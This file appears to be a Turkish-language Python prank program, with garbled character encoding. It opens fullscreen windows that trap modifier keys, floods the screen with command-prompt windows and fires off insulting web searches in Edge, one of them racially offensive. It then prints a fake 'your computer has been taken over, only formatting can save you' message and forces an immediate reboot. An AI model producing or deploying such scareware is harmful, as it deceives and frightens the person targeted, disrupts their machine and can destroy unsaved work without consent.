import tkinter as tk
import os
import sys
import time
import threading
import webbrowser
import random
import string
from tkinter import font
import subprocess

def open_window():
    """
    Ä°lk pencereyi aÃ§ar. KullanÄ±cÄ±dan ÅŸakaya katÄ±lÄ±p katÄ±lmayacaÄŸÄ±nÄ± sorar.
    """
    root = tk.Tk()
    root.title("Senpai lÃ¼tfen benimle oyna :d")
    root.geometry("400x300")
    root.protocol("WM_DELETE_WINDOW", root.destroy)  # Pencere kapatÄ±lÄ±nca uygulamayÄ± sonlandÄ±r
    root.attributes('-topmost', True)

    message = "Miyav! Benimle oynamak ister misin, Senpai?"
    message_label = tk.Label(root, text=message, font=("Helvetica", 12))
    message_label.pack(pady=10)

    def on_click_yes():
        root.destroy()
        show_first_message_screen()

    yes_button = tk.Button(root, text="Evet, OynarÄ±m!", command=on_click_yes)
    yes_button.pack(pady=10)

    root.after(0, lambda: root.focus_force())
    root.mainloop()

def block_key(event):
    """
    Klavye giriÅŸini engellemeye Ã§alÄ±ÅŸÄ±r. Sistem tuÅŸlarÄ±nÄ± engellemez.
    """
    print(f"Bloklanan tuÅŸ: {event.keysym}")
    # Engellenecek tuÅŸlarÄ± kontrol et
    if event.keysym in ['Alt_L', 'Alt_R', 'Control_L', 'Control_R', 'Shift_L', 'Shift_R', 'Win_L', 'Win_R', 'Menu']:
        return "break"  # TuÅŸu engelle
    return

def open_and_close_cmd_repeatedly(duration):
    """
    Belirli bir sÃ¼re boyunca CMD'yi aÃ§Ä±p kapatÄ±r.
    """
    start_time = time.time()
    while time.time() - start_time < duration:
        os.system('start cmd /c "timeout 0.3 & exit"')
        time.sleep(0.15)

def search_on_edge():
    """
    Microsoft Edge'de komik aramalar yapar ve imleÃ§ efektleri ekler.
    """
    user_searches = ["tung tung tung sahur", "turabi"]
    z_gen_searches = ["agla hackledim seni ", "TÃ¼h! tÃ¼m bilgilerin elimde", "NE MAL ADAMSIN LA", "skibidi toilet",
                      "sigma erkek ", "uwu ", "based ", "woke ",
                      "NPC gibisin aq", "EVRÄ°M AGACI"]
    komik_eklemeler = ["roblox komik fotoÄŸraflar", "Komik zenci",
                       "komik anime kÄ±zlarÄ± montaj", "kedi memleri 2024", "Anime kÄ±zlarÄ± gerÃ§ekmi",
                       "minecraft fail anlarÄ±", "komik futbol capsleri", "dede torun ÅŸakalarÄ±",
                       "troll face", "internet trolleri", "komik hayvan videolarÄ± derlemesi",
                       "yanlÄ±ÅŸlÄ±kla Ã§ekilmiÅŸ komik fotoÄŸraflar", "liselilerin komik tweetleri",
                       "oyunlardaki glitchler komik anlar", "en komik kedi videolarÄ±", "komik bebek videolarÄ±",
                       "tÃ¼rkiye deki komik olaylar","komik ÅŸakalar","komik hayvan sesleri"] #uzatÄ±ldÄ±
    all_searches = user_searches + z_gen_searches + komik_eklemeler
    edge_path = "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe"

    for query in all_searches:
        try:
            webbrowser.register('edge', None, webbrowser.BackgroundBrowser(edge_path))
            webbrowser.get('edge').open_new_tab(f"https://www.google.com/search?q={query.replace(' ', '+')}")
            time.sleep(1)
            # Ä°mleÃ§ efektleri (basit bir yaklaÅŸÄ±m, gerÃ§ek imleÃ§ kontrolÃ¼ mÃ¼mkÃ¼n deÄŸil)
            for _ in range(3):  # Efekti birkaÃ§ kez tekrarla
                x, y = random.randint(0, 1920), random.randint(0, 1080)  # Ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne gÃ¶re ayarlanabilir
                print(f"Ä°mleÃ§ pozisyonu: {x}, {y}  X") # Konsola yazdÄ±r
                time.sleep(0.2)
        except Exception as e:
            print(f"Edge aÃ§Ä±lÄ±rken bir hata oluÅŸtu: {e}")
            break

def show_first_message_screen():
    """
    Ä°lk mesaj ekranÄ±nÄ± gÃ¶sterir.
    """
    message_screen = tk.Tk()
    message_screen.attributes('-fullscreen', True)
    message_screen.configure(bg='white')
    message_screen.bind("<Key>", block_key)

    label_text = "Senpai! Sen benim kedimsin artÄ±k ğŸ˜¼"
    label = tk.Label(message_screen, text=label_text, font=("Comic Sans MS", 36, "bold"), fg="purple")
    label.pack(pady=200, anchor=tk.CENTER)

    message_screen.after(2000, lambda: [message_screen.destroy(), show_edge_and_cmd()])

    message_screen.mainloop()

def show_edge_and_cmd():
    """
    Edge ve CMD ekranlarÄ±nÄ± gÃ¶sterir.
    """
    edge_cmd_screen = tk.Tk()
    edge_cmd_screen.attributes('-fullscreen', True)
    edge_cmd_screen.configure(bg='white')
    edge_cmd_screen.bind("<Key>", block_key)

    search_duration = 20
    threading.Thread(target=open_and_close_cmd_repeatedly, args=(search_duration,)).start()
    threading.Thread(target=search_on_edge).start()

    edge_cmd_screen.after(search_duration * 1000 + 2000, lambda: [edge_cmd_screen.destroy(), show_second_white_screen()])

    edge_cmd_screen.mainloop()

def show_second_white_screen():
    """
    Ä°kinci beyaz ekranÄ± gÃ¶sterir ve yeniden baÅŸlatma iÅŸlemini baÅŸlatÄ±r.
    """
    white_screen_2 = tk.Tk()
    white_screen_2.attributes('-fullscreen', True)
    white_screen_2.configure(bg='white')
    white_screen_2.bind("<Key>", block_key)

    label_text = "Senpai! Sen tam bir aptalsÄ±n! ğŸ˜¼"
    label = tk.Label(white_screen_2, text=label_text, font=("Comic Sans MS", 36, "bold"), fg="red")
    label.pack(pady=200, anchor=tk.CENTER)

    def on_closing_second_screen():
        pass

    white_screen_2.protocol("WM_DELETE_WINDOW", on_closing_second_screen)

    white_screen_2.after(5000, cover_screen_with_cmd_and_reboot)

    white_screen_2.mainloop()

def cover_screen_with_cmd_and_reboot():
    """
    EkranÄ± CMD pencereleriyle kaplar, bekler, siyah ekran gÃ¶sterir, yazÄ±lar yazar ve yeniden baÅŸlatÄ±r.
    """
    for _ in range(30):
        os.system('start cmd')
        time.sleep(0.1)
    time.sleep(3)

    cmd_process = subprocess.Popen(['cmd'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    cmd_inputs = [
        "color 00\n",
        "cls\n",
        "echo :D\n",
        "echo BilgisayarÄ±nÄ±z ele geÃ§irildi!\n",
        "echo Format atmadan kurtulamazsÄ±nÄ±z!\n",
        "timeout 5\n",
        "shutdown /r /t 1\n"
    ]
    for cmd_input in cmd_inputs:
        cmd_process.stdin.write(cmd_input.encode('utf-8'))
    cmd_process.stdin.flush()
    cmd_process.communicate()
    cmd_process.wait()

if __name__ == "__main__":
    # EÄŸer yeniden baÅŸlatmadan sonra Ã§alÄ±ÅŸÄ±yorsa bu fonksiyonu Ã§aÄŸÄ±r
    if len(sys.argv) > 1 and sys.argv[1] == "restarted":
        cover_screen_with_cmd_and_reboot()
    else:
        open_window()
